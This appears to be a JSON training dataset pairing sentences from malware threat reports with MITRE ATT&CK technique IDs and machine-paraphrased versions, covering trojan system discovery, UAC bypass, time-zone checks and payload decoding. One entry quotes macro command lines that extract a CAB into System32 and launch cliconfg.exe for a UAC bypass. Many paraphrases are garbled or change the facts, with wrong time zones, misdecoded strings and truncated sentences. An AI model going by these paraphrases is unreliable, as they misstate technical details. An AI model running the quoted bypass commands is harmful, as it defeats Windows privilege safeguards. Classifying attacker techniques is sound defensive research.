            "en_text": "The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was “0000”",
            "data_text": "The Trojan uses the first 4 bytes of this hardware ID as a unique identifier for the system (in this case \"0000\")."
        }
    ],
    "The payload sends system information about the infected computer to the C&C server and downloads additional tools.": [
        {
            "tec_id": "T1082",
            "en_text": "The payload sends system information about the infected computer to the C&C server and downloads additional tools.",
            "data_text": "The payload sends system information about the infected computer to C."
        }
    ],
    "If it is successful then it will send out basic host information and await further commands.": [
        {
            "tec_id": "T1082",
            "en_text": "If it is successful then it will send out basic host information and await further commands.",
            "data_text": "If successful, send default host information and wait for additional commands."
        }
    ],
    "After decoding their C2 server IP addresses, from obfuscated strings, both trojans will attempt to collect host information and send it to the C2 server.": [
        {
            "tec_id": "T1082",
            "en_text": "After decoding their C2 server IP addresses, from obfuscated strings, both trojans will attempt to collect host information and send it to the C2 server.",
            "data_text": "The two Trojans attempt to decode the C2 server IP address from the obfuscated string and then collect host information and send it to the C2 server."
        }
    ],
    "Operating system's name (i.e., the name of the machine) Operating system's OS architecture Operating system's caption Computer system's domain Computer system's username Computer's public IP address": [
        {
            "tec_id": "T1082",
            "en_text": "Operating system's name (i.e., the name of the machine) Operating system's OS architecture Operating system's caption Computer system's domain Computer system's username Computer's public IP address",
            "data_text": "Name of the operating system (i.e., the computer name) OS architecture of the operating system Caption of the operating system Domain of the computer System User name of the computer Public IP address of the computer"
        }
    ],
    "Once successfully installed in a system, Trickbot will gather system information such as OS, CPU, and memory information, user accounts, lists of installed programs and services.": [
        {
            "tec_id": "T1082",
            "en_text": "Once successfully installed in a system, Trickbot will gather system information such as OS, CPU, and memory information, user accounts, lists of installed programs and services.",
            "data_text": "When installed successfully on a system, the trickbot collects system information, such as OS, CPU and memory information, user accounts, and a list of installed programs and services."
        }
    ],
    "(To bypass UAC) configurable setting for the process to abuse  Other than these, new coding algorithm has been introduced": [
        {
            "tec_id": "T1548.002",
            "en_text": "(To bypass UAC) configurable setting for the process to abuse  Other than these, new coding algorithm has been introduced",
            "data_text": "In addition to configurable settings to abuse the process (to bypass UAC), a new coding algorithm has been introduced."
        }
    ],
    "This request is followed by a call to “GetisrunasAbById” to determine if the Trojan should use “runas” to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click": [
        {
            "tec_id": "T1548.002",
            "en_text": "This request is followed by a call to “GetisrunasAbById” to determine if the Trojan should use “runas” to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click",
            "data_text": "This request calls \"GetisrunasAbById\" to determine whether the Trojans should use \"runas\" to run the downloaded executable with high privileges. This will display a UAC dialog box that the user can click on."
        }
    ],
    "The CAB file contains the following files and functions:  dll: A malicious DLL used to launch batch files (used with cliconfg.exe for UAC bypass)": [
        {
            "tec_id": "T1548.002",
            "en_text": "The CAB file contains the following files and functions:  dll: A malicious DLL used to launch batch files (used with cliconfg.exe for UAC bypass)",
            "data_text": "The CAB file contains the following files and functions: dll: cliconfg for the UAC bypass (DLL) used to launch the batch file.Used with exe)"
        }
    ],
    "The macro then extracts the CAB file into %systemroo%\\system32, using either wusa.exe or expand.exe (depending on the OS) to again bypass UAC prompts Once the files have been extracted, the Visual Basic macro deletes the CAB file and runs the malicious NTWDBLIB.dll via cliconfg.exe (to gain privileges and bypass UAC protections) Command lines used by the Visual Basic macro:  cmd /c wusa %TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe cmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows": [],
    "The key differences in this variant:  Two CAB files are encoded into the Word document in text boxes instead of being appended in the DOC file There is one CAB file for an x86 system and another for an x64 system This malware sample uses uacme.exe with dummy.dll to implement the UAC bypass  exe is the program vulnerable to the UAC bypass attack dll runs install.bat to set up the service (same as NTWDBLIB.dll)   exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS": [
        {
            "tec_id": "T1548.002",
            "en_text": "The key differences in this variant:  Two CAB files are encoded into the Word document in text boxes instead of being appended in the DOC file There is one CAB file for an x86 system and another for an x64 system This malware sample uses uacme.exe with dummy.dll to implement the UAC bypass  exe is the program vulnerable to the UAC bypass attack dll runs install.bat to set up the service (same as NTWDBLIB.dll)   exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS",
            "data_text": "The main differences in this model are: Instead of the two CAB files being added to the DOC file, they are encoded into Word documents in the text box. There are CAB files for x86 systems and CAB files for x64 systems. This malware sample uses uacme.exe with dummy.dll to implement UAC bypass exe is a program that runs install.bat for UAC bypass attack dll to set up services, dummy.The dll may be a 64-bit or 32-bit binary based on an OS."
        }
    ],
    "Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself": [
        {
            "tec_id": "T1124",
            "en_text": "Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself",
            "data_text": "Its encoding scheme has been modified from time to time in line with major upgrades of PlugX itself."
        }
    ],
    "The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph": [
        {
            "tec_id": "T1124",
            "en_text": "The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph",
            "data_text": "The PE compilation time of the loader and the dropper (Word document) creation time are displayed on the graph."
        }
    ],
    "Campaign Code and Compile Time Correlation In some cases, there is a close proximity of the compile time of a CARBANAK sample to the month specified in a particular campaign code": [
        {
            "tec_id": "T1124",
            "en_text": "Campaign Code and Compile Time Correlation In some cases, there is a close proximity of the compile time of a CARBANAK sample to the month specified in a particular campaign code",
            "data_text": "Some of the campaign codes and compilation time correlations are close to the compilation time of the CARB.ANAK sample of the month specified for a particular campaign code"
        }
    ],
    "These four were then all modified on the same date and time on October 13, 2018 08:21": [
        {
            "tec_id": "T1124",
            "en_text": "These four were then all modified on the same date and time on October 13, 2018 08:21",
            "data_text": "All four of these were modified at 08:21 on October 13, 2018 on the same date and time."
        }
    ],
    "A possible explanation for this is that the document was copied to another system with an incorrectly set system time, then saved with the incorrect time": [
        {
            "tec_id": "T1124",
            "en_text": "A possible explanation for this is that the document was copied to another system with an incorrectly set system time, then saved with the incorrect time",
            "data_text": "A possible explanation for this is that you copied the document to another system with incorrect system time and then saved it to the wrong time."
        }
    ],
    "Alarmingly, the detection score on VirusTotal for all of the documents continues to be 0/56 from the time the first documents were uploaded (1.6.2017) up until the date of this publication": [
        {
            "tec_id": "T1124",
            "en_text": "Alarmingly, the detection score on VirusTotal for all of the documents continues to be 0/56 from the time the first documents were uploaded (1.6.2017) up until the date of this publication",
            "data_text": "Surprisingly, VirusTotal's detection score for all documents continues to be 0/56, from the time the first document was uploaded (1.6.2017) until this publication date."
        }
    ],
    "This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017": [
        {
            "tec_id": "T1124",
            "en_text": "This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017",
            "data_text": "This is the first time that bank shots have been directly linked to financial-related hacking and have been used for the first time since November 2017."
        }
    ],
    "The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC)": [
        {
            "tec_id": "T1124",
            "en_text": "The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC)",
            "data_text": "The time of the day when APT33 threat actors were active suggests that they were active in a time zone closer to 04:30 than UTC."
        }
    ],
    "The time of the observed attacker activity coincides with Iran’s Daylight Time, which is +0430 UTC": [
        {
            "tec_id": "T1124",
            "en_text": "The time of the observed attacker activity coincides with Iran’s Daylight Time, which is +0430 UTC",
            "data_text": "The observed attacker activity time is consistent with Iran's daylight saving time (UTC +0430)."
        }
    ],
    "Cadelle and Chafer are most active during the day time within Iran’s time zone and primarily operate during Iran’s business week (Saturday through Thursday)": [
        {
            "tec_id": "T1124",
            "en_text": "Cadelle and Chafer are most active during the day time within Iran’s time zone and primarily operate during Iran’s business week (Saturday through Thursday)",
            "data_text": "Cadelle and Chafer are the most active during the day in the Iranian time zone and operate mainly during Iranian business weeks (Saturday to Thursday)."
        }
    ],
    "When the backdoor establishes a connection to the command and control server, it sets the request period time equal to the specified dwell time for the standby mode": [
        {
            "tec_id": "T1124",
            "en_text": "When the backdoor establishes a connection to the command and control server, it sets the request period time equal to the specified dwell time for the standby mode",
            "data_text": "When the backdoor establishes a connection to the command and control server, it sets a request period equal to the dwell time specified for the standby mode."
        }
    ],
    "If the dwell time value for the active mode has been set, but the package has not been received, the dwell time value is incremented by the dwell time value for the active period": [
        {
            "tec_id": "T1124",
            "en_text": "If the dwell time value for the active mode has been set, but the package has not been received, the dwell time value is incremented by the dwell time value for the active period",
            "data_text": "If the dwell time value for the active mode is set but the package is not received, the dwell time value increases by the dwell time value for the active period."
        }
    ],
    "This action is repeated until the dwell time value is bigger or equal to the dwell time value for the standby mode": [
        {
            "tec_id": "T1124",
            "en_text": "This action is repeated until the dwell time value is bigger or equal to the dwell time value for the standby mode",
            "data_text": "This operation is repeated until the dwell time value in standby mode is greater than or equal to ."
        }
    ],
    "Timezone Check The Trojan check to see if the system is configured (“DaylightName”) with one of the following time zones:   Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5)   Human Interaction Check Before executing its functional code, the Trojan presents a dialog box with the following line of code:   Interaction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3), MsgBoxStyle.Critical, null);   This dialog box displays  An error occurred while processing user32.dll!, which the user must click the ok button for the Trojan to run its functional code": [
        {
            "tec_id": "T1124",
            "en_text": "Timezone Check The Trojan check to see if the system is configured (“DaylightName”) with one of the following time zones:   Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5)   Human Interaction Check Before executing its functional code, the Trojan presents a dialog box with the following line of code:   Interaction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3), MsgBoxStyle.Critical, null);   This dialog box displays  An error occurred while processing user32.dll!, which the user must click the ok button for the Trojan to run its functional code",
            "data_text": "Check Time Zone The Trojan horse verifies that the system is configured in one of the following time zones (\"DaylightName\"): Arab Daylight Time (UTC+3) Arab Daylight Time (UTC+4) Before executing the Middle East Daylight Time (UTC+3) function code, it displays a dialog box consisting of the following codes: an interaction.MsgBox (encodedStringClass.return_user32_bogus_errorcode_3), MsgBoxStyle.severe, null); this dialog box encountered an error while processing user32.dll! This error requires the Trojan horse to click the OK button to execute the feature code."
        }
    ],
    "The last technique that was particularly interesting is the time zone check, as the Trojan will not execute its functional code if the system does not have a specific time zone set": [
        {
            "tec_id": "T1124",
            "en_text": "The last technique that was particularly interesting is the time zone check, as the Trojan will not execute its functional code if the system does not have a specific time zone set",
            "data_text": "Finally, an interesting technique is to check the time zone, as the Trojans do not execute functional code unless a specific time zone is set in the system."
        }
    ],
    "Figure 3 Countries in which OopsIE will run in based on the time zone Notable Differences The OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE variant discussed in our previous blog": [
        {
            "tec_id": "T1124",
            "en_text": "Figure 3 Countries in which OopsIE will run in based on the time zone Notable Differences The OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE variant discussed in our previous blog",
            "data_text": "Figure 3 Country IE with Ops runs based on time zone. Notable difference The IE Trojan delivered in this attack had a feature code very similar to that of Ops.IE variants discussed in previous blogs"
        }
    ],
    "In another case the attackers use another code snippet borrowed from the SubTee GitHub project, this time filling in a fully templated .NET application whitelist bypass file: SHA256: 3e9136f95fa55852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2: This time the attacker didn’t have to write any of their own code, instead they were simply able to paste their shellcode directly into a template, in order to launch PlugX as a child process of a trusted application": [
        {
            "tec_id": "T1124",
            "en_text": "In another case the attackers use another code snippet borrowed from the SubTee GitHub project, this time filling in a fully templated .NET application whitelist bypass file: SHA256: 3e9136f95fa55852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2: This time the attacker didn’t have to write any of their own code, instead they were simply able to paste their shellcode directly into a template, in order to launch PlugX as a child process of a trusted application",
            "data_text": "In another case, the attacker uses another code snippet borrowed from the Subty GitHub project, this time filling the entire template.NET Application Whitelist Bypass File: SHA256:3e9136f95852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2: This time, an attacker did not have to write the code directly to the template and could run PlugX as a subprocess of trusted applications."
        }
    ],
    "Watches uninstall time, checks time diff (local time vs internet time)": [
        {
            "tec_id": "T1124",
            "en_text": "Watches uninstall time, checks time diff (local time vs internet time)",
            "data_text": "Check purge time, check time difference (local time vs. Internet time)"
        }
    ],
    "Here’s a python code to decode": [
        {
            "tec_id": "T1140",
            "en_text": "Here’s a python code to decode",
            "data_text": "Here's the Python code to decode."
        }
    ],
    "The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT": [
        {
            "tec_id": "T1140",
            "en_text": "The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT",
            "data_text": "The shell code decodes and decompresses another DLL, an updated variant of the UPPERCUT."
        }
    ],
    "Figure 2: Exploit Shellcode used to Locate and Decode Payload The shellcode (Figure 2) searches for and decodes the executable payload contained in memory between the beginning and ending file markers 0xBABABABA and 0xBBBBBBBB, respectively": [
        {
            "tec_id": "T1140",
            "en_text": "Figure 2: Exploit Shellcode used to Locate and Decode Payload The shellcode (Figure 2) searches for and decodes the executable payload contained in memory between the beginning and ending file markers 0xBABABABA and 0xBBBBBBBB, respectively",
            "data_text": "Figure 2: Retrieves and decodes executable payloads contained in memory between the start and end file markers 0xBAB of shell code (Figure 2) used for finding and decoding payloads.ABBA and 0xBBBBBBBB, respectively"
        }
    ],
    "This function is able to obfuscate code so that every iteration of the code is presented differently": [
        {
            "tec_id": "T1140",
            "en_text": "This function is able to obfuscate code so that every iteration of the code is presented differently",
            "data_text": "This function can obfuscate the code so that all iterations of the code are displayed differently."
        }
    ],
    "It then downloads and decrypts a PNG file": [
        {
            "tec_id": "T1140",
            "en_text": "It then downloads and decrypts a PNG file",
            "data_text": "Then download and decrypt the PNG file."
        }
    ],
    "The state command sets a global variable containing a series of Boolean values represented as ASCII values ‘0’ or ‘1’ and also adds itself to the configuration file": [
        {
            "tec_id": "T1140",
            "en_text": "The state command sets a global variable containing a series of Boolean values represented as ASCII values ‘0’ or ‘1’ and also adds itself to the configuration file",
            "data_text": "The state command sets a global variable that contains a series of boolean values expressed as ASCII values '0' or '1', and also adds itself to the configuration file."
        }
    ],
    "The code comparison specifically shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left": [
        {
            "tec_id": "T1140",
            "en_text": "The code comparison specifically shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left",
            "data_text": "The code comparison specifically shows the HighShell code containing the salt variable containing di2zag7wZ.HTK9YR0NGQ not present in TwoFace code on the left"
        }
    ],
    "Comnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512": [
        {
            "tec_id": "T1140",
            "en_text": "Comnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512",
            "data_text": "Comnie continues to load the built-in bitmap (BMP) file and decrypts the data at offset 0x512."
        }
    ],
    "Figure 11 Embedded BMP file containing encrypted string data RC4 is used to decrypt this data using a 16-byte key that is stored within the BMP file at offset 0x502": [
        {
            "tec_id": "T1140",
            "en_text": "Figure 11 Embedded BMP file containing encrypted string data RC4 is used to decrypt this data using a 16-byte key that is stored within the BMP file at offset 0x502",
            "data_text": "Figure 11 An embedded BMP file containing encrypted string data RC4 is used to decrypt this data using a 16-byte key stored within the BMP file at offset 0x502."
        }
    ],
    "Once decrypted, we are provided with a large list of strings, as seen below (note that the data has been truncated for brevity):  Figure 12 Decrypted strings from embedded BMP file After these strings are decrypted, the malware will load a series of Microsoft Windows API calls to be used later on": [
        {
            "tec_id": "T1140",
            "en_text": "Once decrypted, we are provided with a large list of strings, as seen below (note that the data has been truncated for brevity):  Figure 12 Decrypted strings from embedded BMP file After these strings are decrypted, the malware will load a series of Microsoft Windows API calls to be used later on",
            "data_text": "When decrypted, a large list of strings is provided (data is truncated concisely): Figure 12 After this string is decrypted from the embedded BMP file, the malware loads a series of Microsoft Windows API calls for later use."
        }
    ],
    "In order to decode this data, Comnie first decodes it using base64 with the following non-standard alphabet (note that it is simply the original alphabet in reverse): /+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA   The resulting data is then parsed and decrypted using RC4": [
        {
            "tec_id": "T1140",
            "en_text": "In order to decode this data, Comnie first decodes it using base64 with the following non-standard alphabet (note that it is simply the original alphabet in reverse): /+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA   The resulting data is then parsed and decrypted using RC4",
            "data_text": "To decode this data, Comnie first decodes /+9876543210zyxwvutsrqponmlkjihgfedcbaZ using the following nonstandard alphabets:YXWVUTSRQPONMLKJIHGFEDCBA result data is parsed and decoded using RC4."
        }
    ],
    "Here is the code:The goal of this code is to get information from the properties of the document (\"Subject\", \"Company\", \"Category\", \"Hyperlink base\" and finally \"Comments\")": [
        {
            "tec_id": "T1140",
            "en_text": "Here is the code:The goal of this code is to get information from the properties of the document (\"Subject\", \"Company\", \"Category\", \"Hyperlink base\" and finally \"Comments\")",
            "data_text": "The code is as follows:The purpose of this code is to obtain information from the properties of the document (Subject, \"Company\", \"Category\", \"Hyperlink base\", and finally \"Comments\")."
        }
    ],
    "The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck": [
        {
            "tec_id": "T1140",
            "en_text": "The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck",
            "data_text": "The subdomain 676f6f646c75636b is a hexadecimal encoded string decoded as luck."
        }
    ],
    "This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence": [
        {
            "tec_id": "T1140",
            "en_text": "This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence",
            "data_text": "This DLL provides three main functions: anti-malware removal, main RAT DLL decompression and execution, and persistence acquisition."
        }
    ],
    "The final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime": [
        {
            "tec_id": "T1140",
            "en_text": "The final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime",
            "data_text": "The last debugging technique involves a GetTickCount performance counter, which is placed within a major section of the code to detect delays that the debugger adds during runtime."
        }
    ],
    "Even if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various public repositories and similarities between the different piece of code": [
        {
            "tec_id": "T1140",
            "en_text": "Even if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various public repositories and similarities between the different piece of code",
            "data_text": "Even though this actor's weapons vary, we have identified similarities between several patterns, copy-paste codes in various public repositories, and other pieces of code."
        }
    ],
    "Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory": [
        {
            "tec_id": "T1140",
            "en_text": "Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory",
            "data_text": "The purpose is to load Msadoz<.dll, decrypt it, and execute it in memory."
        }
    ],
    "If after the package has been decoded its size is bigger than 3 bytes, the Trojan decrypts its first 11 bytes with XOR using the method similar to the one described above": [
        {
            "tec_id": "T1140",
            "en_text": "If after the package has been decoded its size is bigger than 3 bytes, the Trojan decrypts its first 11 bytes with XOR using the method similar to the one described above",
            "data_text": "If the package is larger than 3 bytes after being decoded, the Trojan will use a similar method described above to decrypt the first 11 bytes into XOR."
        }
    ],
    "The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory": [
        {
            "tec_id": "T1140",
            "en_text": "The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory",
            "data_text": "The decrypted code resolves the required API functionality, and uses LZNT1 to decompress the PE file embedded in the RtlCompressBuffer() and maps it to memory."
        }
    ],
    "The Visual Basic macro performs the following tasks:  Opens a handle to the malicious document to read the encoded CAB file Decodes the CAB file and writes it to the disk at %temp%\\setup.cab   Encoded CAB file in the Word document": [
        {
            "tec_id": "T1140",
            "en_text": "The Visual Basic macro performs the following tasks:  Opens a handle to the malicious document to read the encoded CAB file Decodes the CAB file and writes it to the disk at %temp%\\setup.cab   Encoded CAB file in the Word document",
            "data_text": "The Visual Basic macro does the following: Open the handle for malicious documents to read the encoded CAB file. Decode the CAB file and write it to disk in the Word document's %temp%\\setup.cab encoded CAB file."
        }
    ],
    "Configuration Decryption:  Another small, but same important function in the photo above, is the function for decrypting the data containing the C&C configuration": [
        {
            "tec_id": "T1140",
            "en_text": "Configuration Decryption:  Another small, but same important function in the photo above, is the function for decrypting the data containing the C&C configuration",
            "data_text": "Decryption of configuration: Another important feature that is small but identical in the picture above is the ability to decry data containing C."
        }
    ],
    "The MirageFox binaries export a function called dll_wWinMain, the name of an export in vsodscpl.dll, a module by McAfee that is loaded by a few of their executables that import and call this function": [
        {
            "tec_id": "T1140",
            "en_text": "The MirageFox binaries export a function called dll_wWinMain, the name of an export in vsodscpl.dll, a module by McAfee that is loaded by a few of their executables that import and call this function",
            "data_text": "MirageFox binary file is vsodscpl.Export the function dll_wWinMain, the export name of dll. This function is a module that is loaded by some of the executables that McAfee imports and invokes."
        }
    ],
    "The most interesting part is the decrypted C&C configuration, as can be seen in the image below": [
        {
            "tec_id": "T1140",
            "en_text": "The most interesting part is the decrypted C&C configuration, as can be seen in the image below",
            "data_text": "The most interesting part is the decoded C."
        }
    ],
    "Figure 2 – The GitHub profile for F0R3X containing both legitimate forked code and the binaries created by the attacker": [
        {
            "tec_id": "T1140",
            "en_text": "Figure 2 – The GitHub profile for F0R3X containing both legitimate forked code and the binaries created by the attacker",
            "data_text": "Figure 2 – F0R3X's GitHub profile that contains both legitimate fork codes and attacker-generated binary files"
        }
    ],
    "It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks": [
        {
            "tec_id": "T1140",
            "en_text": "It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks",
            "data_text": "In addition, macro code can access internal VBA objects, making it easier to execute macro code in future attacks."
        }
    ],
    "Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle": [
        {
            "tec_id": "T1140",
            "en_text": "Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle",
            "data_text": "The main loop of the Backdoor Analysis backdoor has two main functions: infoClient and runHandle."
        }
    ],
    "Packet::getData decrypts the received payload and Converter::outString descrambles the result": [
        {
            "tec_id": "T1140",
            "en_text": "Packet::getData decrypts the received payload and Converter::outString descrambles the result",
            "data_text": "Packet:getData decodes the received payload and Converter:outString describes the result"
        }
    ],
    "In the event this is successful the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  It proceeds to load and decrypt and embedded bitmap resource file": [
        {
            "tec_id": "T1140",
            "en_text": "In the event this is successful the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  It proceeds to load and decrypt and embedded bitmap resource file",
            "data_text": "If successful, the malware uses the following path to save the lost files: %CommonPROGRAMFILES%\\services\\If unsuccessful, this alternate path will be used instead. Load and decrypt the %APPDATA%\\microsoft\\mmc\\ embedded bitmap resource file."
        }
    ],
    "In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine": [
        {
            "tec_id": "T1140",
            "en_text": "In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine",
            "data_text": "If successful, the malware uses the following path to save the lost files: %CommonPROGRAMFILES%\\services\\If unsuccessful, this alternate path will be used instead. %APPDATA%\\microsoft\\mmc\\Reaver.v2 decrypts included files using a simple XOR obfuscation routine."
        }
    ],
    "The malware proceeds to decrypt and embedded configuration of 128 bytes using a simple XOR routine": [
        {
            "tec_id": "T1140",
            "en_text": "The malware proceeds to decrypt and embedded configuration of 128 bytes using a simple XOR routine",
            "data_text": "Malware proceeds with 128-byte decryption and built-in configuration using a simple XOR routine."
        }
    ],
    "ESET’s analysis of a recent backdoor used by TeleBots – the group behind the massive NotPetya ransomware outbreak – uncovers strong code similarities to the Industroyer main backdoor, revealing a rumored connection that was not previously proven The post New TeleBots backdoor: First evidence linking Industroyer to NotPetya appeared first on WeLiveSecurity": [
        {
            "tec_id": "T1140",
            "en_text": "ESET’s analysis of a recent backdoor used by TeleBots – the group behind the massive NotPetya ransomware outbreak – uncovers strong code similarities to the Industroyer main backdoor, revealing a rumored connection that was not previously proven The post New TeleBots backdoor: First evidence linking Industroyer to NotPetya appeared first on WeLiveSecurity",
            "data_text": "ESET's analysis of the recently used backdoor by TeleBots, a group behind a large Not Petya ransomware incident, reveals a strong code similarity to the Industroyer main backdoor, revealing a previously unproven rumored connection New TeleBots backdoor: First evidence linking Industryer and Not Petya appeared in WeLive.security"
        }
    ],
    "The following code snippet was used to decode strings within OopsIE:out = \"\" for e in obfuscated_string.split(\"-\"):    out += chr(int(e)-1)When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis environment, as discussed in the previous section": [
        {
            "tec_id": "T1140",
            "en_text": "The following code snippet was used to decode strings within OopsIE:out = \"\" for e in obfuscated_string.split(\"-\"):    out += chr(int(e)-1)When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis environment, as discussed in the previous section",
            "data_text": "The following code snippets were used to decode strings within the oops.IE:out = \"e for in an aggregated_string.domb-\"): out += chr(int(e)-1) When running for the first time, as described in the previous section, IE variants run various checks to prevent running in the analytical environment."
        }
    ],
    "This exception invokes the exception handler containing the HTTP communication code, allowing it to run": [
        {
            "tec_id": "T1140",
            "en_text": "This exception invokes the exception handler containing the HTTP communication code, allowing it to run",
            "data_text": "This exception allows execution by invoking an exception handler that contains an HTTP communication code."
        }
    ],
    "Figure 1 – The main code from the .NET wrapper, with the Shellcode array being created and executed in a new thread": [
        {
            "tec_id": "T1140",
            "en_text": "Figure 1 – The main code from the .NET wrapper, with the Shellcode array being created and executed in a new thread",
            "data_text": "Figure 1 – Main code in .NET where Shellcode array is created and run in the new thread"
        }
    ],
    "The first shellcode decrypts a further shellcode block": [
        {
            "tec_id": "T1140",
            "en_text": "The first shellcode decrypts a further shellcode block",
            "data_text": "The first shell code decodes additional shell code blocks."
        }
    ],
    "After decrypting the strings, they must be further decompressed using LZNT1": [
        {
            "tec_id": "T1140",
            "en_text": "After decrypting the strings, they must be further decompressed using LZNT1",
            "data_text": "After decrypting the string, you must further extract it using LZNT1."
        }
    ],
    "It then reads and decrypts the content between these values to yield an IP address as shown below:       ---- BEGIN SSH2 PUBLIC KEY ----Comment: \"rsa-key\"AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=---- END SSH2 PUBLIC KEY ----     A Python script to decode strings encrypted with this technique is given in Appendix B – Python Scripts": [],
    "To decode this information, BADNEWS takes the following steps:  Base64-decode the string Perform the decoding cipher used in previous versions Base64-decode the result Decrypt the result using the Blowfish algorithm and a static key  A script, which is included in the Appendix, will decrypt data from these dead drop resolvers": [
        {
            "tec_id": "T1140",
            "en_text": "To decode this information, BADNEWS takes the following steps:  Base64-decode the string Perform the decoding cipher used in previous versions Base64-decode the result Decrypt the result using the Blowfish algorithm and a static key  A script, which is included in the Appendix, will decrypt data from these dead drop resolvers",
            "data_text": "To decode this information, perform the following steps in BADNEWS: Perform the decoding password used in previous versions of Base64-decode the string Use the result decode Blowfish algorithm and static keys to decrypt the results. The script contained in the appendix decodes the data in these deaddrop resolvers."
        }
    ],
    "Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document": [
        {
            "tec_id": "T1140",
            "en_text": "Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document",
            "data_text": "Interestingly, the delivery document borrowed a technique disclosed by sophisticated threat actors in late 2017 to include key malicious code in the document's EXIF metadata properties."
        }
    ],
    "The main function of the Trojan interacts with its configured C2 server to obtain additional code to execute": [
        {
            "tec_id": "T1140",
            "en_text": "The main function of the Trojan interacts with its configured C2 server to obtain additional code to execute",
            "data_text": "The main function of the Trojan Horse interacts with the configured C2 server to obtain additional code to run."
        }
    ],
    "The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string": [
        {
            "tec_id": "T1140",
            "en_text": "The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string",
